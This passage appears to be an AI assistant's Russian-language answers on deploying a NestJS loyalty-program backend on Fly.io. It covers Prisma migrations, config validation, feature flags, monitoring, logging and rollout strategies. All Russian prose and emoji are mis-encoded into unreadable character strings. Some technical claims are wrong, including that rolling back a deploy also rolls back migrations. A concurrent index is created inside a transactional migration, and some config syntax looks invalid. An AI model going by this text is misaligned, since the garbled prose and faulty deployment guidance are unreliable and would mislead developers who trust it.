**ะะะะะะก:** ะะพะณะดะฐ ะฟัะธะผะตะฝััั ะผะธะณัะฐัะธะธ Prisma - ะดะพ ะธะปะธ ะฟะพัะปะต ะดะตะฟะปะพั?

**ะะฐัะธะฐะฝัั:**

**A) ะะตัะตะด ะดะตะฟะปะพะตะผ (ะฒ CI)** โญ

```yaml
- name: Run migrations
  run: npx prisma migrate deploy
  env:
    DATABASE_URL: ${{ secrets.DATABASE_URL }}

- name: Deploy
  run: flyctl deploy
```

**B) ะะพัะปะต ะดะตะฟะปะพั (ะฒ postdeploy hook)**

```toml
# fly.toml
[deploy]
  release_command = "npx prisma migrate deploy"
```

**C) ะัััะฝัั ัะตัะตะท SSH**

***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: B) Release command ะฒ Fly.io**

**ะะพัะตะผั:**

- โ ะะธะณัะฐัะธะธ ะฟัะธะผะตะฝััััั ะฐัะพะผะฐัะฝะพ ั ะดะตะฟะปะพะตะผ
- โ Rollback ะดะตะฟะปะพั = rollback ะผะธะณัะฐัะธะน
- โ ะะต ะฑะปะพะบะธััะตั CI pipeline

**fly.toml:**

```toml
[deploy]
  release_command = "sh -c 'npx prisma migrate deploy && npx prisma generate'"
  strategy = "rolling"
```

**ะะตะทะพะฟะฐัะฝะพััั:**

```typescript
// ะะพะฑะฐะฒะปัะตะผ timeout ะดะปั ะผะธะณัะฐัะธะน
// prisma/migrations/20260212_add_guests/migration.sql
-- Timeout 10 ัะตะบัะฝะด
SET statement_timeout = '10s';

ALTER TABLE "Guest" ADD COLUMN "email" TEXT;
CREATE INDEX CONCURRENTLY "Guest_email_idx" ON "Guest"("email");
```


***

ะัะพะดะพะปะถะธัั ั ะพััะฐะปัะฝัะผะธ 25 ะฒะพะฟัะพัะฐะผะธ? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **1๏ธโฃ1๏ธโฃ Environment-specific ะบะพะฝัะธะณััะฐัะธะธ: ะะฐะบ ัะฟัะฐะฒะปััั dev/staging/production?**

**ะะะะะะก:** ะะฐะบ ะพัะณะฐะฝะธะทะพะฒะฐัั ะบะพะฝัะธะณััะฐัะธะธ ะดะปั ัะฐะทะฝัั ะพะบััะถะตะฝะธะน?

**ะะฐัะธะฐะฝัั:**

**A) .env ัะฐะนะปั (dev/staging/production)**

```
.env.development
.env.staging
.env.production
```

**B) Config module ั ะฒะฐะปะธะดะฐัะธะตะน** โญ

```typescript
// config/configuration.ts
import { z } from 'zod';

const configSchema = z.object({
  NODE_ENV: z.enum(['development', 'staging', 'production']),
  DATABASE_URL: z.string().url(),
  REDIS_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  // ...
});

export const config = () => {
  const parsed = configSchema.safeParse(process.env);
  if (!parsed.success) {
    throw new Error(`Config validation error: ${parsed.error}`);
  }
  return parsed.data;
};
```

**C) ะัะดะตะปัะฝัะต Fly.io ะฟัะธะปะพะถะตะฝะธั ะดะปั ะบะฐะถะดะพะณะพ ะพะบััะถะตะฝะธั**

```bash
fly apps create max-loyalty-production
fly apps create max-loyalty-staging
fly apps create max-loyalty-dev
```


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: B) Config module + C) ะัะดะตะปัะฝัะต Fly.io apps**

**ะะพัะตะผั:**

- โ Type-safe ะบะพะฝัะธะณััะฐัะธั
- โ ะะฐะปะธะดะฐัะธั ะฟัะธ ััะฐััะต (fail fast)
- โ ะะทะพะปะธัะพะฒะฐะฝะฝัะต ะพะบััะถะตะฝะธั
- โ ะะฐะทะฝัะต ะะ ะดะปั ะบะฐะถะดะพะณะพ ะพะบััะถะตะฝะธั

**ะะตะฐะปะธะทะฐัะธั:**

```typescript
// apps/backend/src/config/configuration.ts
import { z } from 'zod';

const envSchema = z.object({
  // Environment
  NODE_ENV: z.enum(['development', 'staging', 'production']).default('development'),
  PORT: z.coerce.number().default(3000),
  
  // Database
  DATABASE_URL: z.string().url(),
  DATABASE_POOL_SIZE: z.coerce.number().default(10),
  
  // Redis
  REDIS_URL: z.string().url(),
  
  // JWT
  JWT_SECRET: z.string().min(32),
  JWT_REFRESH_SECRET: z.string().min(32),
  JWT_ACCESS_EXPIRY: z.string().default('15m'),
  JWT_REFRESH_EXPIRY: z.string().default('30d'),
  
  // Storage
  S3_ENDPOINT: z.string().url(),
  S3_BUCKET: z.string(),
  S3_ACCESS_KEY: z.string(),
  S3_SECRET_KEY: z.string(),
  S3_REGION: z.string().default('auto'),
  
  // Email
  RESEND_API_KEY: z.string(),
  
  // SMS
  SMS_RU_API_KEY: z.string(),
  
  // Monitoring
  BETTER_STACK_TOKEN: z.string().optional(),
  
  // External APIs
  YOOKASSA_SHOP_ID: z.string().optional(),
  YOOKASSA_SECRET_KEY: z.string().optional(),
});

export type Config = z.infer<typeof envSchema>;

export function validateConfig(): Config {
  const result = envSchema.safeParse(process.env);
  
  if (!result.success) {
    console.error('โ Invalid environment variables:');
    console.error(JSON.stringify(result.error.format(), null, 2));
    throw new Error('Config validation failed');
  }
  
  return result.data;
}

export const config = validateConfig();
```

```typescript
// apps/backend/src/config/config.module.ts
import { Module, Global } from '@nestjs/common';
import { ConfigModule as NestConfigModule } from '@nestjs/config';
import { validateConfig } from './configuration';

@Global()
@Module({
  imports: [
    NestConfigModule.forRoot({
      isGlobal: true,
      validate: validateConfig,
      cache: true,
    }),
  ],
})
export class ConfigModule {}
```

**Fly.io apps:**

```bash
# Production
fly apps create max-loyalty-prod
fly secrets set -a max-loyalty-prod \
  DATABASE_URL="postgresql://prod..." \
  JWT_SECRET="..." \
  # ...

# Staging
fly apps create max-loyalty-staging
fly secrets set -a max-loyalty-staging \
  DATABASE_URL="postgresql://staging..." \
  JWT_SECRET="..." \
  # ...

# ะะตะฟะปะพะน ะฒ ะบะพะฝะบัะตัะฝะพะต ะพะบััะถะตะฝะธะต
fly deploy -a max-loyalty-staging
fly deploy -a max-loyalty-prod
```


***

### **1๏ธโฃ2๏ธโฃ Feature flags: ะัะถะฝั ะปะธ ะดะปั ะฟะพััะตะฟะตะฝะฝะพะณะพ ัะพะปะปะฐััะฐ?**

**ะะะะะะก:** ะัะฟะพะปัะทะพะฒะฐัั feature flags ะดะปั ะฒะบะปััะตะฝะธั ะฝะพะฒัั ัะธั ะฟะพััะตะฟะตะฝะฝะพ?

**ะะฐัะธะฐะฝัั:**

**A) ะะตะท feature flags (ะดะตะฟะปะพะธะผ ะฒัั ััะฐะทั)**

**B) Simple boolean flags ะฒ database** โญ

```typescript
// FeatureFlag entity
{
  key: 'loyalty_transfers_enabled',
  enabled: true,
  tenantId: null  // null = ะณะปะพะฑะฐะปัะฝะพ ะดะปั ะฒัะตั
}
```

**C) LaunchDarkly / PostHog (external service)**

**D) Custom feature flag service ั targeting**

```typescript
// ะะพะถะฝะพ ะฒะบะปััะฐัั ะดะปั ะบะพะฝะบัะตัะฝัั ัะตะฝะฐะฝัะพะฒ
{
  key: 'new_promo_engine',
  enabled: true,
  targeting: {
    tenants: ['tenant-123', 'tenant-456']
  }
}
```


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: B) Simple boolean flags ะฒ ะฝะฐัะฐะปะต, D) ะฟัะธ ัะพััะต**

**ะะพัะตะผั:**

- โ ะะพะถะฝะพ ะฒะบะปััะฐัั/ะฒัะบะปััะฐัั ัะธัะธ ะฑะตะท ะดะตะฟะปะพั
- โ A/B ัะตััะธัะพะฒะฐะฝะธะต ะฝะพะฒัั ัะธั
- โ Kill switch ะฟัะธ ะฑะฐะณะฐั
- โ ะะพััะตะฟะตะฝะฝัะน rollout (ัะฝะฐัะฐะปะฐ 10% ัะตะฝะฐะฝัะพะฒ)

**ะะตะฐะปะธะทะฐัะธั (Phase 1 - Simple):**

```typescript
// apps/backend/src/feature-flags/feature-flag.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';

export enum FeatureFlag {
  LOYALTY_TRANSFERS = 'loyalty_transfers',
  NEW_PROMO_ENGINE = 'new_promo_engine',
  TELEGRAM_MINI_APP = 'telegram_mini_app',
  ADVANCED_ANALYTICS = 'advanced_analytics',
}

@Injectable()
export class FeatureFlagService {
  constructor(private prisma: PrismaService) {}

  async isEnabled(flag: FeatureFlag, tenantId?: string): Promise<boolean> {
    // ะัะพะฒะตััะตะผ tenant-specific flag
    if (tenantId) {
      const tenantFlag = await this.prisma.featureFlag.findUnique({
        where: {
          key_tenantId: {
            key: flag,
            tenantId,
          },
        },
      });
      if (tenantFlag) return tenantFlag.enabled;
    }

    // Fallback ะฝะฐ ะณะปะพะฑะฐะปัะฝัะน flag
    const globalFlag = await this.prisma.featureFlag.findUnique({
      where: {
        key_tenantId: {
          key: flag,
          tenantId: null,
        },
      },
    });

    return globalFlag?.enabled ?? false;
  }

  async enable(flag: FeatureFlag, tenantId?: string) {
    await this.prisma.featureFlag.upsert({
      where: {
        key_tenantId: {
          key: flag,
          tenantId: tenantId ?? null,
        },
      },
      create: {
        key: flag,
        enabled: true,
        tenantId: tenantId ?? null,
      },
      update: {
        enabled: true,
      },
    });
  }

  async disable(flag: FeatureFlag, tenantId?: string) {
    await this.prisma.featureFlag.update({
      where: {
        key_tenantId: {
          key: flag,
          tenantId: tenantId ?? null,
        },
      },
      data: {
        enabled: false,
      },
    });
  }
}
```

**Guard ะดะปั ะทะฐัะธัั endpoint:**

```typescript
// feature-flags/feature-flag.guard.ts
import { Injectable, CanActivate, ExecutionContext } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { FeatureFlagService, FeatureFlag } from './feature-flag.service';

@Injectable()
export class FeatureFlagGuard implements CanActivate {
  constructor(
    private reflector: Reflector,
    private featureFlagService: FeatureFlagService,
  ) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const flag = this.reflector.get<FeatureFlag>('featureFlag', context.getHandler());
    if (!flag) return true;

    const request = context.switchToHttp().getRequest();
    const tenantId = request.user?.tenantId;

    return this.featureFlagService.isEnabled(flag, tenantId);
  }
}

// Decorator
export const RequireFeature = (flag: FeatureFlag) => SetMetadata('featureFlag', flag);
```

**ะัะฟะพะปัะทะพะฒะฐะฝะธะต:**

```typescript
@Post('transfer')
@RequireFeature(FeatureFlag.LOYALTY_TRANSFERS)
@UseGuards(FeatureFlagGuard)
async transferBalls(@Body() dto: TransferBallsDto) {
  // ะะพัััะฟะฝะพ ัะพะปัะบะพ ะตัะปะธ ัะธัะฐ ะฒะบะปััะตะฝะฐ
}
```


***

### **1๏ธโฃ3๏ธโฃ Monitoring: ะะฐะบะธะต ะผะตััะธะบะธ ัะพะฑะธัะฐัั?**

**ะะะะะะก:** ะงัะพ ะผะพะฝะธัะพัะธัั ะฒ production?

**ะะะ ะะะจะะะะ (Better Stack + Custom Metrics):**

**ะะฝััะฐััััะบัััะฝัะต ะผะตััะธะบะธ:**

- โ CPU usage (< 80%)
- โ Memory usage (< 85%)
- โ Disk usage (< 90%)
- โ Network I/O

**Application ะผะตััะธะบะธ:**

- โ HTTP request rate (requests/sec)
- โ Response time (p50, p95, p99)
- โ Error rate (< 1%)
- โ Active connections

**Database ะผะตััะธะบะธ:**

- โ Connection pool usage
- โ Query duration (slow queries > 1s)
- โ Deadlocks
- โ Database size

**Business ะผะตััะธะบะธ:**

- โ ะะพััะตะน ัะพะทะดะฐะฝะพ/ะดะตะฝั
- โ ะขัะฐะฝะทะฐะบัะธะน ะฑะฐะปะปะพะฒ/ัะฐั
- โ POS webhook failures
- โ Telegram bot ะฐะบัะธะฒะฝะพััั

**ะะตะฐะปะธะทะฐัะธั:**

```typescript
// apps/backend/src/monitoring/metrics.service.ts
import { Injectable } from '@nestjs/common';
import { Logtail } from '@logtail/node';

@Injectable()
export class MetricsService {
  private logtail = new Logtail(process.env.BETTER_STACK_TOKEN);

  // HTTP metrics
  trackRequest(method: string, path: string, statusCode: number, duration: number) {
    this.logtail.info('http_request', {
      method,
      path,
      status_code: statusCode,
      duration_ms: duration,
      timestamp: new Date().toISOString(),
    });
  }

  // Business metrics
  trackGuestCreated(tenantId: string, source: 'cashier' | 'link' | 'telegram') {
    this.logtail.info('guest_created', {
      tenant_id: tenantId,
      source,
      timestamp: new Date().toISOString(),
    });
  }

  trackBallTransaction(
    tenantId: string,
    type: 'earn' | 'redeem',
    amount: number,
    source: 'pos' | 'manual' | 'promo',
  ) {
    this.logtail.info('ball_transaction', {
      tenant_id: tenantId,
      type,
      amount,
      source,
      timestamp: new Date().toISOString(),
    });
  }

  trackPOSWebhook(
    tenantId: string,
    status: 'success' | 'failed',
    provider: 'iiko' | 'rkeeper',
    error?: string,
  ) {
    this.logtail.info('pos_webhook', {
      tenant_id: tenantId,
      status,
      provider,
      error,
      timestamp: new Date().toISOString(),
    });
  }

  // Error tracking
  trackError(error: Error, context: Record<string, any>) {
    this.logtail.error('application_error', {
      error_message: error.message,
      error_stack: error.stack,
      ...context,
      timestamp: new Date().toISOString(),
    });
  }
}
```

**Middleware ะดะปั HTTP ะผะตััะธะบ:**

```typescript
// monitoring/metrics.middleware.ts
import { Injectable, NestMiddleware } from '@nestjs/common';
import { Request, Response, NextFunction } from 'express';
import { MetricsService } from './metrics.service';

@Injectable()
export class MetricsMiddleware implements NestMiddleware {
  constructor(private metrics: MetricsService) {}

  use(req: Request, res: Response, next: NextFunction) {
    const start = Date.now();

    res.on('finish', () => {
      const duration = Date.now() - start;
      this.metrics.trackRequest(
        req.method,
        req.path,
        res.statusCode,
        duration,
      );
    });

    next();
  }
}
```


***

### **1๏ธโฃ4๏ธโฃ Alerting: ะะพะณะดะฐ ะพัะฟัะฐะฒะปััั ัะฒะตะดะพะผะปะตะฝะธั?**

**ะะะะะะก:** ะะฐะบะธะต ะฐะปะตััั ะฝะฐัััะพะธัั ะฒ Better Stack?

**ะะะ ะะะจะะะะ:**

**๐ด CRITICAL (ััะฐะทั ะฒ Telegram):**

- โ Backend down (> 2 ะผะธะฝััั)
- โ Database unavailable
- โ Error rate > 5%
- โ Memory usage > 95%
- โ Payment webhook failed (YooKassa)

**๐ก WARNING (email ะธะปะธ Telegram ัะฐะท ะฒ ัะฐั):**

- โ Response time p95 > 2s
- โ Disk usage > 80%
- โ Slow queries > 5s
- โ POS webhook failures > 10/hour

**๐ข INFO (ัะพะปัะบะพ ะฒ ะดะฐัะฑะพัะด):**

- โ New tenant registered
- โ Subscription upgraded
- โ Large ball transaction (> 10,000)

**Better Stack ะฝะฐัััะพะนะบะฐ:**

```yaml
# better-stack-config.yml (ะธะผะฟะพััะธััะตะผ ัะตัะตะท UI)
monitors:
  - name: Backend API Health
    url: https://api.max-loyalty.com/health
    interval: 60  # ะบะฐะถะดัั ะผะธะฝััั
    threshold: 2  # 2 ะฝะตัะดะฐัะธ ะฟะพะดััะด = alert
    notifications:
      - type: telegram
        channel: "@max_loyalty_alerts"
      - type: email
        recipients: ["admin@max-loyalty.com"]

  - name: Database Connections
    type: metric
    query: "database.connections.active"
    threshold: "> 90"
    severity: warning

  - name: Error Rate
    type: metric
    query: "http.errors.rate"
    threshold: "> 5%"
    severity: critical
    notifications:
      - type: telegram
        channel: "@max_loyalty_alerts"
```


***

### **1๏ธโฃ5๏ธโฃ Logging: ะงัะพ ะปะพะณะธัะพะฒะฐัั ะธ ะฒ ะบะฐะบะพะผ ัะพัะผะฐัะต?**

**ะะะะะะก:** ะกัััะบัััะฐ ะปะพะณะพะฒ ะธ ััะพ ะฒะบะปััะฐัั?

**ะะะ ะะะจะะะะ: Structured JSON logs**

```typescript
// apps/backend/src/logging/logger.service.ts
import { Injectable, LoggerService as NestLoggerService } from '@nestjs/common';
import { Logtail } from '@logtail/node';
import { createLogger, format, transports } from 'winston';

@Injectable()
export class LoggerService implements NestLoggerService {
  private logtail = new Logtail(process.env.BETTER_STACK_TOKEN);
  
  private winston = createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: format.combine(
      format.timestamp(),
      format.errors({ stack: true }),
      format.json(),
    ),
    defaultMeta: {
      service: 'max-loyalty-backend',
      environment: process.env.NODE_ENV,
    },
    transports: [
      new transports.Console({
        format: format.combine(
          format.colorize(),
          format.simple(),
        ),
      }),
    ],
  });

  log(message: string, context?: Record<string, any>) {
    this.winston.info(message, context);
    this.logtail.info(message, context);
  }

  error(message: string, trace?: string, context?: Record<string, any>) {
    this.winston.error(message, { trace, ...context });
    this.logtail.error(message, { trace, ...context });
  }

  warn(message: string, context?: Record<string, any>) {
    this.winston.warn(message, context);
    this.logtail.warn(message, context);
  }

  debug(message: string, context?: Record<string, any>) {
    this.winston.debug(message, context);
    // ะะต ะพัะฟัะฐะฒะปัะตะผ debug ะฒ Better Stack (ัะบะพะฝะพะผะธะผ ะบะฒะพัั)
  }

  verbose(message: string, context?: Record<string, any>) {
    this.winston.verbose(message, context);
  }
}
```

**ะงัะพ ะปะพะณะธััะตะผ:**

```typescript
// โ DO: ะะพะณะธััะตะผ ะฑะธะทะฝะตั-ัะพะฑััะธั
logger.log('Guest created', {
  guestId: guest.id,
  tenantId: tenant.id,
  source: 'telegram',
  userId: user.id,
});

logger.log('Ball transaction completed', {
  transactionId: tx.id,
  guestId: guest.id,
  type: 'earn',
  amount: 500,
  balanceBefore: 1000,
  balanceAfter: 1500,
});

// โ DO: ะะพะณะธััะตะผ ะพัะธะฑะบะธ ั ะบะพะฝัะตะบััะพะผ
logger.error('Failed to process POS webhook', {
  error: error.message,
  stack: error.stack,
  webhookId: webhook.id,
  provider: 'iiko',
  checkId: check.id,
});

// โ DON'T: ะะต ะปะพะณะธััะตะผ sensitive data
logger.log('User logged in', {
  userId: user.id,
  email: user.email,  // โ
  password: user.password,  // โโโ
});

// โ DO: ะะฐัะบะธััะตะผ sensitive data
logger.log('User logged in', {
  userId: user.id,
  email: maskEmail(user.email),  // "a***@example.com"
});

// โ DON'T: ะะต ะปะพะณะธััะตะผ ะฒ ัะธะบะปะฐั (ะฟะตัะตะฟะพะปะฝัะตั ะบะฒะพัั)
guests.forEach(guest => {
  logger.log('Processing guest', { guestId: guest.id });  // โ
});

// โ DO: ะะพะณะธััะตะผ batch ะพะฟะตัะฐัะธะธ
logger.log('Processing guests batch', {
  count: guests.length,
  tenantId: tenant.id,
});
```


***

## ๐ **ะะะะ 3: FLY.IO DEPLOYMENT (5 ะฒะพะฟัะพัะพะฒ)**

### **1๏ธโฃ6๏ธโฃ Fly.io ะบะพะฝัะธะณััะฐัะธั: ะกะบะพะปัะบะพ VM ะธ ะบะฐะบะพะณะพ ัะฐะทะผะตัะฐ?**

**ะะะะะะก:** ะะฐะบ ัะฐัะฟัะตะดะตะปะธัั 3 ะฑะตัะฟะปะฐัะฝัั VM ะฝะฐ free tier?

**ะะะ ะะะจะะะะ:**

```
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ   VM 1: Backend API (256 MB RAM)       โ
โ   - NestJS HTTP server                  โ
โ   - Health checks                       โ
โ   - WebSockets (ะดะปั Telegram)           โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ

โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ   VM 2: Worker (256 MB RAM)             โ
โ   - BullMQ job processor                โ
โ   - Email/SMS sending                   โ
โ   - Analytics aggregation               โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ

โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ   VM 3: Cron Jobs (256 MB RAM)          โ
โ   - Daily ball expiration check         โ
โ   - Level recalculation                 โ
โ   - Reconciliation jobs                 โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
```

**fly.toml:**

```toml
# apps/backend/fly.toml
app = "max-loyalty-prod"
primary_region = "fra"  # Frankfurt (ะฑะปะธะถะต ะบ ะะค ะบะปะธะตะฝัะฐะผ)

[build]
  dockerfile = "Dockerfile"

[env]
  NODE_ENV = "production"
  PORT = "3000"

[processes]
  api = "node dist/main.js"
  worker = "node dist/main.js"
  cron = "node dist/main.js"

[processes.env]
  api.PROCESS_TYPE = "api"
  worker.PROCESS_TYPE = "worker"
  cron.PROCESS_TYPE = "cron"

# VM ะดะปั API (ะพะฑัะฐะฑะฐััะฒะฐะตั HTTP)
[[vm]]
  processes = ["api"]
  memory = "256mb"
  cpu_kind = "shared"
  cpus = 1

# VM ะดะปั Worker
[[vm]]
  processes = ["worker"]
  memory = "256mb"
  cpu_kind = "shared"
  cpus = 1

# VM ะดะปั Cron
[[vm]]
  processes = ["cron"]
  memory = "256mb"
  cpu_kind = "shared"
  cpus = 1

# HTTP service (ัะพะปัะบะพ ะดะปั API process)
[[services]]
  processes = ["api"]
  protocol = "tcp"
  internal_port = 3000

  [[services.ports]]
    port = 80
    handlers = ["http"]
    force_https = true

  [[services.ports]]
    port = 443
    handlers = ["tls", "http"]

  [services.concurrency]
    type = "connections"
    hard_limit = 250
    soft_limit = 200

  [[services.tcp_checks]]
    interval = "15s"
    timeout = "2s"
    grace_period = "10s"

  [[services.http_checks]]
    interval = "30s"
    timeout = "5s"
    grace_period = "10s"
    method = "get"
    path = "/health/ready"
    protocol = "http"

# Release command (ะผะธะณัะฐัะธะธ)
[deploy]
  release_command = "npx prisma migrate deploy && npx prisma generate"
  strategy = "rolling"

# ะะฒัะพัะบะตะนะปะธะฝะณ (ะฝะตะดะพัััะฟะฝะพ ะฝะฐ free tier, ะฝะพ ะพััะฐะฒะธะผ ะดะปั ะฑัะดััะตะณะพ)
[scaling]
  min_machines = 1
  max_machines = 3  # ะัะธ ะฟะตัะตัะพะดะต ะฝะฐ ะฟะปะฐัะฝัะน ะฟะปะฐะฝ
```


***

### **1๏ธโฃ7๏ธโฃ PostgreSQL ะฝะฐ Fly.io: ะัะฟะพะปัะทะพะฒะฐัั ะฒัััะพะตะฝะฝัะน ะธะปะธ Neon.tech?**

**ะะะะะะก:** Fly.io PostgreSQL vs Neon.tech?

**ะกะะะะะะะะ:**


| ะะฐัะฐะผะตัั | Fly.io PostgreSQL | Neon.tech |
| :-- | :-- | :-- |
| Storage | 3 GB | 3 GB |
| RAM | 256 MB | 0.5 GB |
| Backups | ะัััะฝัั | ะะฒัะพ (point-in-time) |
| Branching | โ | โ (git-like branches) |
| Connection pooling | ะัะถะฝะพ ะฝะฐัััะพะธัั | โ ะัััะพะตะฝ |
| Latency | ะะธะทะบะฐั (ัะฐ ะถะต ะทะพะฝะฐ) | +10-20ms |
| Maintenance | ะกะฐะผ | Managed |


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: Neon.tech**

**ะะพัะตะผั:**

- โ Database branching (ัะพะทะดะฐัะผ ะบะพะฟะธั ะดะปั ัะตััะพะฒ)
- โ ะะฒัะพะฑัะบะฐะฟั (point-in-time restore)
- โ Connection pooling ะธะท ะบะพัะพะฑะบะธ
- โ ะะต ะฝัะถะฝะพ ะพะฑัะปัะถะธะฒะฐัั

**Setup:**

```bash
# ะกะพะทะดะฐัะผ Neon database
neon projects create max-loyalty-prod --region eu-central-1

# ะะพะปััะฐะตะผ connection string
neon connection-string max-loyalty-prod

# ะะพะฑะฐะฒะปัะตะผ ะฒ Fly.io secrets
fly secrets set DATABASE_URL="postgresql://user:pass@neon.tech:5432/max_loyalty_prod"
```

**Connection pooling ะฒ Prisma:**

```typescript
// prisma/schema.prisma
datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
  directUrl = env("DIRECT_DATABASE_URL")  // ะะปั ะผะธะณัะฐัะธะน
}

generator client {
  provider = "prisma-client-js"
  previewFeatures = ["driverAdapters"]
}
```

```typescript
// database/prisma.service.ts
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';

@Injectable()
export class PrismaService extends PrismaClient implements OnModuleInit, OnModuleDestroy {
  constructor() {
    super({
      datasources: {
        db: {
          url: process.env.DATABASE_URL,
        },
      },
      log: process.env.NODE_ENV === 'development' 
        ? ['query', 'error', 'warn'] 
        : ['error'],
    });
  }

  async onModuleInit() {
    await this.$connect();
  }

  async onModuleDestroy() {
    await this.$disconnect();
  }
}
```


***

### **1๏ธโฃ8๏ธโฃ Redis ะฝะฐ Fly.io: ะัััะพะตะฝะฝัะน ะธะปะธ Upstash?**

**ะะะะะะก:** Upstash Serverless Redis vs Fly.io Redis?

**ะกะะะะะะะะ:**


| ะะฐัะฐะผะตัั | Fly.io Redis | Upstash |
| :-- | :-- | :-- |
| Storage | ะะฐะฒะธัะธั ะพั VM | 256 MB |
| Commands | Unlimited | 10,000/ะดะตะฝั |
| Latency | <1ms | 5-20ms |
| Persistence | ะัะถะฝะพ ะฝะฐัััะพะธัั | โ ะะฒัะพ |
| Multi-region | โ | โ |
| Pricing | ะะฐะฝะธะผะฐะตั VM | Free 10k/day |


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: Upstash ะดะปั MVP**

**ะะพัะตะผั:**

- โ ะะต ะทะฐะฝะธะผะฐะตั VM (ัะบะพะฝะพะผะธะผ ะดะปั Backend/Worker/Cron)
- โ 10,000 commands ัะฒะฐัะธั ะดะปั MVP
- โ Multi-region (ะฝะธะทะบะฐั latency)
- โ REST API (fallback ะตัะปะธ Redis client ะฝะต ัะฐะฑะพัะฐะตั)

**Setup:**

```bash
# ะกะพะทะดะฐัะผ Upstash Redis
# https://console.upstash.com/redis

# ะะพะฑะฐะฒะปัะตะผ ะฒ Fly secrets
fly secrets set REDIS_URL="redis://default:pass@upstash.io:6379"
fly secrets set UPSTASH_REDIS_REST_URL="https://xxx.upstash.io"
fly secrets set UPSTASH_REDIS_REST_TOKEN="xxx"
```

**Redis service:**

```typescript
// apps/backend/src/redis/redis.service.ts
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import Redis from 'ioredis';

@Injectable()
export class RedisService implements OnModuleInit, OnModuleDestroy {
  private client: Redis;

  async onModuleInit() {
    this.client = new Redis(process.env.REDIS_URL, {
      maxRetriesPerRequest: 3,
      enableReadyCheck: true,
      lazyConnect: false,
    });

    this.client.on('error', (err) => {
      console.error('Redis error:', err);
    });

    this.client.on('connect', () => {
      console.log('โ Redis connected');
    });
  }

  async onModuleDestroy() {
    await this.client.quit();
  }

  // Proxy methods
  async get(key: string): Promise<string | null> {
    return this.client.get(key);
  }

  async set(key: string, value: string, ttl?: number): Promise<void> {
    if (ttl) {
      await this.client.setex(key, ttl, value);
    } else {
      await this.client.set(key, value);
    }
  }

  async del(key: string): Promise<void> {
    await this.client.del(key);
  }

  async ping(): Promise<string> {
    return this.client.ping();
  }

  // For BullMQ
  getClient(): Redis {
    return this.client;
  }
}
```


***

### **1๏ธโฃ9๏ธโฃ Fly.io ัะตะณะธะพะฝั: ะะดะต ัะฐะทะผะตัะฐัั VM?**

**ะะะะะะก:** ะ ะบะฐะบะพะผ ัะตะณะธะพะฝะต Fly.io ัะฐะทะฒะพัะฐัะธะฒะฐัั ะดะปั ะะค ะบะปะธะตะฝัะพะฒ?

**ะะพัััะฟะฝัะต ัะตะณะธะพะฝั ะฑะปะธะทะบะพ ะบ ะะค:**


| ะะตะณะธะพะฝ | ะะพะด | Latency ะธะท ะะพัะบะฒั |
| :-- | :-- | :-- |
| Frankfurt, Germany | `fra` | ~40ms โญ |
| Amsterdam, Netherlands | `ams` | ~50ms |
| Warsaw, Poland | `waw` | ~45ms |
| Stockholm, Sweden | `arn` | ~55ms |


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: `fra` (Frankfurt)**

**ะะพัะตะผั:**

- โ ะกะฐะผัะน ะฝะธะทะบะธะน latency ะธะท ะะพัะบะฒั (~40ms)
- โ ะััะฟะฝัะน ะดะฐัะฐัะตะฝัั (ััะฐะฑะธะปัะฝะพััั)
- โ Neon.tech ัะพะถะต ะธะผะตะตั `eu-central-1` (ััะฐะฝะบัััั)

**fly.toml:**

```toml
primary_region = "fra"
```


***

### **2๏ธโฃ0๏ธโฃ Blue-Green deployment: ะะฐะบ ะดะตะปะฐัั zero-downtime deploys?**

**ะะะะะะก:** ะกััะฐัะตะณะธั ะดะตะฟะปะพั ะฑะตะท ะฟัะพััะพั?

**ะะฐัะธะฐะฝัั ะฝะฐ Fly.io:**

**A) Rolling deployment (default)** โญ

```toml
[deploy]
  strategy = "rolling"
  wait_timeout = "5m"
```

- ะััะฐะฝะฐะฒะปะธะฒะฐะตั ััะฐััะน ะธะฝััะฐะฝั โ ะทะฐะฟััะบะฐะตั ะฝะพะฒัะน โ ะฟัะพะฒะตััะตั health โ ะฟะตัะตะบะปััะฐะตั ััะฐัะธะบ

**B) Canary deployment**

```toml
[deploy]
  strategy = "canary"
```

- 10% ััะฐัะธะบะฐ ะฝะฐ ะฝะพะฒัะน โ ะฟัะพะฒะตััะตั ะผะตััะธะบะธ โ ัะฐัะบะฐััะฒะฐะตั ะฝะฐ 100%

**C) Blue-Green (manual)**

```bash
# ะะตะฟะปะพะธะผ ะฝะฐ staging
fly deploy -a max-loyalty-staging

# ะขะตััะธััะตะผ
curl https://staging.max-loyalty.com/health

# ะะตัะตะบะปััะฐะตะผ ััะฐัะธะบ ะฝะฐ staging
fly scale count 0 -a max-loyalty-prod
fly scale count 1 -a max-loyalty-staging
fly apps rename max-loyalty-staging max-loyalty-prod
```


***

## ๐ฏ **ะะะฏ ะะะะะะะะะะฆะะฏ: A) Rolling (ะฝะฐ free tier), B) Canary (ะฝะฐ ะฟะปะฐัะฝะพะผ)**

**ะะพัะตะผั:**

- โ Rolling = zero-downtime ะฝะฐ 1 VM (health check ะฟะตัะตะด ะฟะตัะตะบะปััะตะฝะธะตะผ)
